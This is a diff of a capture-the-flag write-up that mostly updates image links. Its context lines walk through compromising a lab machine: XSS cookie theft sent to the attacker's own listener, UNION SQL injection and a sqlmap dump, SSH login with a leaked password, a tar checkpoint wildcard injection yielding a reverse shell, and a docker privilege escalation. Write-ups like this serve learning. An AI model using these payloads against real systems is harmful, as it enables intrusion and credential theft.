@@ -41,7 +41,8 @@ Nmap done: 1 IP address (1 host up) scanned in 22.45 seconds
 So as we can see we have a simple structure of an ssh login on port 22 and an http webserver on port 80 that is mirrored for nodejs on port 32768. So lets head over to the website! While looking over the website I will run gobuster in the back to find hidden directories.
 
 Okay so we can signup lets do that first thing that catches my eye is the new listing featurenwe can probably upload a revshell there. (Also gobuster returned nothing intresting.) After trying to upload an image I see they have blocked that by putting a No image placeholder:
-![[Screen Shot 2022-03-08 at 7.01.31 PM.png]]
+
+![Screen1](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-08%20at%207.01.31%20PM.png)
 
 So lets just try an XSS attack! With a simple `<script>alert('Hello!')</script>` in the description it works! we get a succesful alert. So lets take it to the next level and check if anyone (like an admin) is checking our post!
 
@@ -77,7 +78,8 @@ app.listen(port, () => {
 ```
 
 then just run `npm i express body-parser` and were good to go!
-![[Screen Shot 2022-03-08 at 5.49.37 PM.png]]
+
+![Screen2](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-08%20at%205.49.37%20PM.png)
 
 Now back to the website if we change our script tu send post data to `YOURIP/cookies` we should get it logged directly! Easy right? We can use the following code as a test in our console to make sure we get the data.
 
@@ -119,7 +121,7 @@ After doing that we get:
 
 Cookies! Yay! We can now use firefox dev tools or just a chrome cookie editor extension and change our token to the admins!
 
-![[Screen Shot 2022-03-08 at 7.23.09 PM.png]]
+![Screen3](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-08%20at%207.23.09%20PM.png)
 
 We now have access to the admins panel + our first flag GG! Lets keep going!
 If we click on a user we can see this kind of url: `http://10.10.215.43/admin?user=4`
@@ -132,20 +134,22 @@ So what if we tried inserting in the url the following SQL query:
 `6 UNION SELECT @@version,1,1,1;---`
  We get a positive result! 
  
- ![[Screen Shot 2022-03-08 at 10.26.04 PM.png]]
+![Screen4](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-08%20at%2010.26.04%20PM.png)
  
 So now lets run sqlmap on it:
 `sqlmap http://<IP>/admin?user=3 --cookie='token=<TOKEN>' --technique=U --delay=2 -dump`
 
 This will give us some juicy info
-![[Screen Shot 2022-03-08 at 11.08.44 PM.png]]
+
+![Screen5](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-08%20at%2011.08.44%20PM.png)
+ 
 Here we have the users table with some hashed passwords. We also get an intresting message:
 `Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ`
 
 and it was to `user_id 3` which means thats jake! Lets try logging into
 `ssh jake@ip`
 
-![[Screen Shot 2022-03-08 at 11.12.54 PM.png]]
+![Screen5](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-08%20at%2011.12.54%20PM.png)
 
 Sick! Were in baby!! We can now just `cat user.txt` and get the second flag!
 Time for the best part Priv Esc. I will run a simple [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) 
@@ -178,7 +182,8 @@ echo "" > --checkpoint=1
 ```
 
 now if we open a `nc -nvlp 9999` on our machine and try to run: `sudo -u michael /opt/backups/backup.sh` we get an error about backup.tar permissions for michael so lets just `mv backup.tar bk.tar` and now if we run it again we get a reverse shell for michael!
-![[Screen Shot 2022-03-09 at 11.27.51 AM.png]]
+
+![Screen6](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen Shot 2022-03-09 at 11.27.51 AM.png)
 
 Lets just run a quick `python -c 'import pty; pty.spawn("/bin/sh")'` to get a better shell. So as we saw earlier in linPEAS michael is  docker user so we can exploit that with a quick [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) search! If we just scroll down to ==sudo== we can find the following payload:
 ```
